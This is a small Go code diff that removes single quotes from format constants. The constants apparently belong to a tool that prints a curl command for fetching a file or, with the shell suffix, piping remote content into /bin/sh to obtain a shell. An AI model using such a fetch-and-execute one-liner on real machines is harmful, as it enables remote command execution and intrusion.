@@ -32,15 +32,15 @@ import (
 const (
 	// CurlFormat prints the start of the curl command used to connect
 	// to us.
-	CurlFormat = `curl -sk --pinnedpubkey 'sha256//%s' 'https://%s`
+	CurlFormat = `curl -sk --pinnedpubkey sha256//%s https://%s`
 
 	// FileSuffix is added to CurlFormat when telling the user how to get
 	// a file.
-	FileSuffix = "'"
+	FileSuffix = ""
 
 	// ShellSuffix is added to CurlFormat when telling the user haw to get
 	// a shell.
-	ShellSuffix = "/c' | /bin/sh"
+	ShellSuffix = "/c | /bin/sh"
 )
 
 // Log messages and keys.
